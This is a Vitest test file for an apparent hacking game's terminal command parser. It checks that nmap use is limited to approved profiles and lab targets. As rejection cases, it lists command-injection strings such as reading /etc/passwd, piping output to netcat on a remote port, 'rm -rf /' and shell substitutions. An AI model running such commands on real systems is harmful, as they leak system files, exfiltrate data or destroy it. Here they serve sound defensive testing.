import { describe, it, expect } from 'vitest';
import { parseTerminalCommand, APPROVED_NMAP_PROFILES } from '../src/shared/commandParser.js';

describe('Typed command parser & ordinary vs lab-tool separation', () => {
  it('separates ordinary RootWars commands from allowed lab-tool commands', () => {
    const statusCmd = parseTerminalCommand('status');
    expect(statusCmd.ok).toBe(true);
    if (statusCmd.ok) {
      expect(statusCmd.command.category).toBe('ordinary');
      expect(statusCmd.command.kind).toBe('status');
    }

    const mapCmd = parseTerminalCommand('map --region neo-cascadia');
    expect(mapCmd.ok).toBe(true);
    if (mapCmd.ok && mapCmd.command.kind === 'map') {
      expect(mapCmd.command.category).toBe('ordinary');
      expect(mapCmd.command.region).toBe('neo-cascadia');
    }

    const connectCmd = parseTerminalCommand('connect --target node-infra-ixp');
    expect(connectCmd.ok).toBe(true);
    if (connectCmd.ok && connectCmd.command.kind === 'connect') {
      expect(connectCmd.command.target).toBe('node-infra-ixp');
    }

    const labOpenCmd = parseTerminalCommand('lab open --mission msn-lab-01');
    expect(labOpenCmd.ok).toBe(true);
    if (labOpenCmd.ok && labOpenCmd.command.kind === 'lab_open') {
      expect(labOpenCmd.command.missionId).toBe('msn-lab-01');
    }

    const nmapCmd = parseTerminalCommand('nmap --profile service --target 10.240.10.10');
    expect(nmapCmd.ok).toBe(true);
    if (nmapCmd.ok && nmapCmd.command.kind === 'nmap') {
      expect(nmapCmd.command.category).toBe('lab_tool');
      expect(nmapCmd.command.profile).toBe('service');
      expect(nmapCmd.command.target).toBe('10.240.10.10');
    }
  });

  it('strictly rejects shell metacharacters and command injection attempts', () => {
    const injections = [
      'status; cat /etc/passwd',
      'nmap --profile quick | nc 1.1.1.1 4444',
      'connect --target node-infra-ixp && rm -rf /',
      'inspect --target `whoami`',
      'map --region $(id)'
    ];

    for (const raw of injections) {
      const res = parseTerminalCommand(raw);
      expect(res.ok).toBe(false);
      if (!res.ok) {
        expect(res.error.code).toBe('SHELL_METACHARACTER_REJECTED');
      }
    }
  });
});

describe('Allowed tool arguments & lab target allowlist', () => {
  it('rejects unapproved Nmap profiles, scripts, file outputs, and raw flags', () => {
    const badArgs = [
      'nmap --profile aggressive-exploit',
      'nmap --script vuln',
      'nmap --profile service -oN /tmp/scan.txt',
      'nmap --profile quick -sC',
      'nmap --profile service --spoof-mac 0'
    ];

    for (const raw of badArgs) {
      const res = parseTerminalCommand(raw);
      expect(res.ok).toBe(false);
      if (!res.ok) {
        expect(res.error.code).toBe('DISALLOWED_TOOL_ARGUMENT');
      }
    }
  });

  it('rejects public internet IPs, localhost, hostnames and non-lab private subnets', () => {
    const forbiddenTargets = [
      'nmap --profile quick --target 1.1.1.1',
      'nmap --profile service --target 8.8.8.8',
      'nmap --profile service --target 127.0.0.1',
      'nmap --profile service --target 192.168.1.1',
      'nmap --profile service --target 172.16.1.1',
      'nmap --profile service --target scanme.nmap.org'
    ];

    for (const raw of forbiddenTargets) {
      const res = parseTerminalCommand(raw);
      expect(res.ok).toBe(false);
      if (!res.ok) {
        expect(res.error.code).toBe('UNAUTHORIZED_LAB_TARGET');
      }
    }
  });

  it('exposes only the four approved profiles and never a raw argument escape hatch', () => {
    expect(Object.keys(APPROVED_NMAP_PROFILES).sort()).toEqual([
      'compliance-audit',
      'full-ports',
      'quick',
      'service'
    ]);
    for (const profile of Object.values(APPROVED_NMAP_PROFILES)) {
      expect(profile.nmapArgs.every((a) => typeof a === 'string')).toBe(true);
      // No script execution, file output, or target injection in any profile.
      expect(profile.nmapArgs.join(' ')).not.toMatch(/--script|-sC|-oN|-oX|-iL|--spoof/);
    }
  });
});
